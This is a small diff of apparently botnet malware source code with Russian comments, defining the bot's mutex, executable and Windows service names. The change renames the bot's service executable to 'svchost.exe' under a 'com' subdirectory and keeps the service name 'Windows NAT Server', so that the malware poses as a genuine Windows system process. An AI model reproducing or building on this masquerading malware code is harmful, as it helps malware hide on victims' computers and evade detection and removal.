@@ -56,8 +56,12 @@ CSSTR StrBotGlobalMutexName[] = "GSA28593KFE7"; // Префикс глобального мьютекса 
 // Оригинальное имя ехе файла бота
 CSSTR EStrOriginalBotExeName[] = "WtJoeBt.exe";
 
-// Оригинальное имя ехе файла сервиса бота
-//CSSTR EStrOriginalBotServiceExeName[] = "WnJtkBts.exe";
+// Поддирректория сервиса
+CSSTR EStrBotServiceExePath[] = "com\\";
+
+// Имя ехе файла сервиса бота
+CSSTR EStrBotServiceExeName[] = "svchost.exe";
+
 
 // Имя сервиса
 CSSTR EStrServiceName[] = "Windows NAT Server";
